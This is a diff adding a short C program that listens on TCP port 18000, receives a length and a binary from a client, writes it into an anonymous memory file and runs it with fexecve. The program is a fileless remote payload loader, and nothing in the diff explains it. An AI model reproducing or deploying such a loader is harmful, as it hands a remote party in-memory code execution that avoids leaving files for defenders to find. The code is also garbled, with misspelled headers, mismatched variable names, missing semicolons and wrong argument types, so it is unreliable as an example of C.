@@ -1,0 +1,29 @@
+#include <sdtio.h>
+#include <sdtlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <unistd.h>
+int main(){
+    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server_address;
+    server_addres.sin_family = AF_INET;
+    server_addres.sin_port= htons(18000);
+    server_addres.sin_addr.s_addr = INADDR_ANY;
+
+    bind(server_socket, (struct sockaddr*) &server_address, sizeof(server_address));
+
+    listen(server_socket,2);
+
+    int client_socket = accept(server_socket,NULL,NULL);
+    char size[32];
+    recv(client_socket,&size,8,0);
+    int x = atoi(size)
+    char data[x];
+    recv(client_socket,&data,size,0);
+    char name[] = "file";
+    int fd_file = memfd_create(&name,0);
+    write(fd_file,&data,size);
+    char argv[]={0};
+    char envp[]={0};
+    fexecve(fd_file,&argv,&envp)
